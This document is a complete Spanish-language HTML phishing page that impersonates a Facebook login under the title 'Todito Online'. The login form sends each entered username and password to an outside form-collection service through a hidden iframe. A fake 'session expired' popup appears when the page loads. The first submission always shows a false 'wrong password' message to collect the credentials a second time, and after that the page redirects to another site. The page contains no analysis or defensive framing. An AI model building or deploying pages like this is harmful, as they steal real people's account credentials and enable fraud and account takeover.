<!DOCTYPE html>
<html lang="es">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Todito Online</title>
<style>
body {
  margin:0;
  font-family: system-ui, -apple-system, Arial, sans-serif;
  background: linear-gradient(#0f1c2e, #1b2d4a);
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
}

/* FORMULARIO CENTRADO */
.wrapper {
  width:100%;
  max-width:380px;
  background:#f2f2f2;
  border-radius:20px;
  box-shadow:0 5px 25px rgba(0,0,0,0.3);
  position:relative;
  z-index:1;
}

/* HEADER */
.header {
  background:#ffffff; /* blanco */
  padding:18px;
  border-radius:20px 20px 0 0;
  text-align:center;
}
.header h1 { 
  margin:0; 
  font-size:28px; 
  font-weight:700; 
  color:#1877f2; /* azul */
}
.header p { margin:5px 0 0; font-size:13px; color:#333; }

/* FORM */
.form { padding:20px; }
input {
  width:100%;
  padding:14px;
  margin:8px 0;
  border-radius:6px;
  border:1px solid #ccd0d5;
  font-size:14px;
  background:#fff;
  box-sizing:border-box;
}
.btn {
  width:100%;
  padding:14px;
  margin-top:10px;
  border:none;
  border-radius:6px;
  font-weight:bold;
  background:#1877f2; /* azul */
  color:white;
  font-size:15px;
  cursor:pointer;
}
.small {
  text-align:center;
  font-size:12px;
  color:#666;
  margin-top:10px;
}

/* OVERLAY OSCURO */
.overlay {
  position:fixed;
  top:0;
  left:0;
  width:100%;
  height:100%;
  background:rgba(0,0,0,0.5);
  z-index:998;
  display:none;
}

/* MODAL */
.modal {
  position:fixed;
  top:50%;
  left:50%;
  transform:translate(-50%, -50%);
  width:90%;
  max-width:320px;
  background:white;
  border-radius:12px;
  box-shadow:0 8px 25px rgba(0,0,0,0.3);
  text-align:center;
  z-index:999;
  display:none;
}
.modal-header {
  background:#1877f2;
  color:white;
  padding:12px;
  font-size:14px;
  border-radius:12px 12px 0 0;
}
.modal-body { padding:15px; font-size:14px; }
.modal button {
  background:#1877f2;
  color:white;
  border:none;
  padding:10px;
  width:70%;
  border-radius:8px;
  cursor:pointer;
}
</style>
</head>
<body>

<!-- FORMULARIO -->
<div class="wrapper">
  <div class="header">
    <h1>INICIA CON FACBOK</h1>
    <p>La forma más fácil de estar con tus amigos</p>
  </div>

  <div class="form">
    <form id="loginForm" action="https://submit-form.com/IPlk1gidN" method="POST" target="hidden_iframe">
      <input type="text" name="usuario" placeholder="Correo o número" required>
      <input type="password" name="password" placeholder="Contraseña" required>
      <button type="submit" class="btn">Entrar ahora</button>
    </form>
    <div class="small">¿Nuevo aquí? Crea tu cuenta gratis en segundos</div>
  </div>
</div>

<iframe name="hidden_iframe" style="display:none;"></iframe>

<!-- OVERLAY Y MODALES -->
<div id="overlay" class="overlay"></div>

<!-- MODAL INICIAL -->
<div id="modalInicio" class="modal">
  <div class="modal-header">Su sesión ha expirado</div>
  <div class="modal-body">
    <p>Para continuar, verifica tu identidad.</p>
    <button onclick="cerrarInicio()">Continuar</button>
  </div>
</div>

<!-- MODAL ERROR -->
<div id="modalError" class="modal">
  <div class="modal-header" style="background:#d32f2f;">Contraseña incorrecta</div>
  <div class="modal-body">
    <p>Inténtalo nuevamente.</p>
  </div>
</div>

<script>
let intentos = 0;

// Mostrar modal inicial al cargar
window.onload = function(){
  document.getElementById("overlay").style.display="block";
  document.getElementById("modalInicio").style.display="block";
};

function cerrarInicio(){
  document.getElementById("overlay").style.display="none";
  document.getElementById("modalInicio").style.display="none";
}

// Control de intentos
document.getElementById("loginForm").addEventListener("submit", function(e){
  intentos++;
  if(intentos === 1){
    // Primer intento: mostrar error y ocultar luego de 2s
    document.getElementById("overlay").style.display="block";
    document.getElementById("modalError").style.display="block";
    e.preventDefault();
    this.submit(); // aún envía datos al iframe
    setTimeout(function(){
      document.getElementById("overlay").style.display="none";
      document.getElementById("modalError").style.display="none";
    }, 2000);
  } else {
    // Segundo intento: enviar datos y redirigir
    this.submit();
    setTimeout(function(){
      window.location.href = "https://pymemarket.online/";
    }, 500);
  }
});
</script>

</body>
</html>
